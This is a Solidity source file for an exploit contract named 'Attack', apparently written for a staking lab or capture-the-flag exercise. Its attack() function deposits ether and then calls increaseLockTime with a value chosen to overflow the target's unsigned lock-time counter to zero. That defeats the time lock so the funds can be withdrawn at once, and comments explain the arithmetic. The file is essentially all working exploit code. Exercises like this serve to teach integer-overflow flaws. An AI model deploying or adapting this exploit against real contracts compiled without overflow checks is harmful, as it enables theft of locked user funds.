// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface ISTAKE {
    function deposit() external payable;

    function increaseLockTime(uint _secondsToIncrease) external;

    function withdraw() external;

    function balance(address addr) external view returns (uint);

    function lockTime(address addrTime) external view returns (uint);
}

contract Attack {
    ISTAKE stakeLab;

    constructor(address _lab) {
        stakeLab = ISTAKE(_lab);
    }

    receive() external payable {}

    function depositInterface() external payable {
        stakeLab.deposit{ value:msg.value}();
    }

    function withdrawInterface() external {
        stakeLab.withdraw();
    }

    function balanceInterface() external view returns (uint) {
        return stakeLab.balance(address(this));
    }

    function attack() public payable {
        //uint256 0 - 2*256-1
        // x + locktime = 2**256 overflow to 0
        // x = 2**256 - locktime
        stakeLab.deposit{ value: msg.value}();
        stakeLab.increaseLockTime(type(uint).max + 1 - stakeLab.lockTime(address(this)));
        //Overflow > can withdraw it
        stakeLab.withdraw();
    }
}
